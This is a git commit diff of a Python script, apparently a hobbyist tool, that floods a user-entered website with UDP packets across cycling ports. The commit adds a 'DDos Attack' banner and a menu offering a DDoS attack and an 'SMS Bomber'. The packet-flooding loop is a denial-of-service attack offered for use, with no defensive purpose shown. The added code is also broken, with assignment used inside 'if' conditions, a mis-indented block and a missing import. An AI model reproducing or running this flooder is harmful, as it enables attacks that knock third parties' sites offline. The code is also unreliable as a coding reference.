474625e822731d8d901e830df1b3460ccc0e579e
alexpikman <73315445+alexpikman@users.noreply.github.com>
2021-11-21 21:45:19 +0300

    Update t.py

--- t.py
+++ t.py
@@ -4,10 +4,6 @@ import time
 import socket
 import random
 
-os.system("clear")
-
-print ('Wellcome to PQcyber softing')
-#Code Time
 from datetime import datetime
 now = datetime.now()
 hour = now.hour
@@ -16,50 +12,52 @@ day = now.day
 month = now.month
 year = now.year
 
-##############
+os.system("clear")
+os.system("figlet DDos Attack")
+
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 bytes = random._urandom(1490)
-#############
-
-#  ip_list = []
-#  ais = socket.getaddrinfo("www.yahoo.com",0,0,0,0)
-#  for result in ais:
-#  ip_list.append(result[-1][0])
-#  ip_list = list(set(ip_list))
-
-print
-site = input('Адрес сайта: ')
-#ip = [sitename]
-ip = socket.gethostbyname(site)
-# for result in ip:
-# ip.append(result[-1][0])     
-print(ip)
-print(ip[1])
-#print(ip[3])
-#print(site[2])
-#print(site[3])
-
-print ('Site IP: ')
-print(ip)
-
-#ip = int(input('IP: '))
-print
-port = int(input('port: '))
 
 sent = 0
+limit = 0
+
+print('##########################################')
+print ('Wellcome to PQcyberSPAM softing')
+print
+print
+print ('Get SOFT')
+print ('[1] - DDoS Attack http://SITE')
+print ('[2] - SMS Bomber')
+print('##########################################')
+print
+print
+print
+
+print
+app = int(input('select a number to launch the app'))
+
+if app = 1:
+    print
+site = input('Имя сайта: ')
+ip = socket.gethostbyname(site) 
+
+print ('Site IP: ',ip)
+#print(ip)
+
+print
+port = int(input('port: '))
+print
+limit = int(input('attack limit: '))
+
+
 
 while True:
      sock.sendto(bytes, (ip,port))
      sent = sent + 1
      port = port + 1
      print ('Sent %s packet to %s throught port:%s'%(sent,ip,port))
+     if sent = limit:
+          sys.exit()
      if port == 65534:
        port = 1
 
-a = int(input('Number?'))
-if a < -5:
-    print('Low')
-elif -5 <= a <= 5:
-    print('Mid')
-else:
-    print('High')
